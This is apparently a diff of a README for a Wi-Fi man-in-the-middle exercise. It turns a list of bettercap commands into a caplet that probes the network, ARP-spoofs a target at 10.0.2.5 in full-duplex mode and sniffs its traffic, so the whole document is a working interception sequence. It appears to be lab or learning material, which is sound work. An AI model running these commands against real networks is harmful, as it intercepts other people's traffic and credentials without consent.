@@ -1,20 +1,13 @@
 # wifi_router-MMTK
 
-     bettercap -iface wlan0
-     help
-     net.probe on 
-     net.show
-
     
-    help arp.spoof
-    arp.spoof.fullduplex true 
     
-    set arp.spoof.targets [ vigtim ip]
-    arp.spoof on
-    net.sniff on
-
-    
-
+net.probe on
+set arp.spoof.fullduplex true 
+set arp.spoof.targets 10.0.2.5
+arp.spoof on
+set net.sniff.local true
+net.sniff on
 
 
 # Automate BetterCAP using Caplets
